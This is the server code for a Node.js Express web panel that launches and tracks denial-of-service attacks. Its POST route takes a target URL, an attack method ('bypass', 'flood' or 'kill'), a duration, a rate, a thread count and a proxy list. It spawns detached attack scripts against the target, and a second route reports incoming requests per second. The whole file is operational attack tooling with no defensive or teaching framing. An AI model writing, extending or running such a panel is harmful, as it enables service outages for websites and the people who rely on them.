const express = require('express');
const { spawn } = require('child_process');
const fs = require('fs').promises;
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const logFile = path.join(__dirname, 'data', 'requests.log');
const ongoingAttacks = new Map(); // Using Map for better key-value management

// Ensure log directory exists
async function initializeLogDir() {
    try {
        await fs.mkdir(path.dirname(logFile), { recursive: true });
    } catch (error) {
        console.error('Failed to create log directory:', error);
    }
}

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Log and return requests per second
app.get('/api', async (req, res) => {
    const currentTime = Date.now();
    const ip = req.ip;
    const logEntry = `${currentTime},${ip}\n`;

    try {
        await fs.appendFile(logFile, logEntry, { flag: 'a' });
        res.json(await getRequestsPerSecond());
    } catch (error) {
        console.error('Error logging request:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Get ongoing attacks
app.get('/api/ongoing', (req, res) => {
    res.json(Array.from(ongoingAttacks.values()));
});

// Start an attack
app.post('/api', async (req, res) => {
    const { method = 'kill', target, time = 260, rate = 30, threads = 10, proxyfile = 'prx.txt' } = req.body;

    // Input validation
    if (!target) {
        return res.status(400).json({ message: 'Target URL is required' });
    }
    if (!['bypass', 'flood', 'kill'].includes(method)) {
        return res.status(400).json({ message: 'Invalid method. Must be bypass, flood, or kill' });
    }

    const scriptPath = path.join(__dirname, `${method}.js`);
    try {
        await fs.access(scriptPath); // Check if script exists
    } catch {
        return res.status(400).json({ message: `Script ${method}.js not found` });
    }

    try {
        // Spawn child process with enhanced error handling
        const attack = spawn('node', [scriptPath, target, time, rate, threads, proxyfile], {
            detached: true,
            stdio: ['ignore', 'pipe', 'pipe'] // Capture stdout and stderr
        });

        const attackInfo = {
            method,
            target,
            time,
            rate,
            threads,
            proxyfile,
            pid: attack.pid,
            startedAt: Date.now()
        };

        ongoingAttacks.set(attack.pid, attackInfo);

        // Log child process output
        attack.stdout.on('data', (data) => {
            console.log(`[PID ${attack.pid}] stdout: ${data}`);
        });

        attack.stderr.on('data', (data) => {
            console.error(`[PID ${attack.pid}] stderr: ${data}`);
        });

        attack.on('error', (error) => {
            console.error(`[PID ${attack.pid}] error: ${error.message}`);
            ongoingAttacks.delete(attack.pid);
        });

        attack.on('close', (code) => {
            console.log(`[PID ${attack.pid}] exited with code ${code}`);
            ongoingAttacks.delete(attack.pid);
        });

        attack.unref(); // Allow parent process to exit independently

        res.json({ message: `Attack started with ${method}.js`, pid: attack.pid });
    } catch (error) {
        console.error('Error starting attack:', error);
        res.status(500).json({ message: 'Failed to start attack' });
    }
});

// Calculate requests per second
async function getRequestsPerSecond() {
    try {
        const fileExists = await fs.access(logFile).then(() => true).catch(() => false);
        if (!fileExists) {
            return [Date.now(), 0];
        }

        const content = await fs.readFile(logFile, 'utf8');
        const lines = content.split('\n').filter(line => line.trim());
        const currentTime = Date.now();
        const recentRequests = lines.filter(line => {
            const timestamp = parseInt(line.split(',')[0]);
            return (currentTime - timestamp) <= 1000;
        });

        return [currentTime, recentRequests.length];
    } catch (error) {
        console.error('Error calculating requests per second:', error);
        return [Date.now(), 0];
    }
}

// Initialize and start server
async function startServer() {
    await initializeLogDir();
    const port = process.env.PORT || 3000;
    app.listen(port, () => {
        console.log(`API running on port ${port}`);
    });
}

startServer();
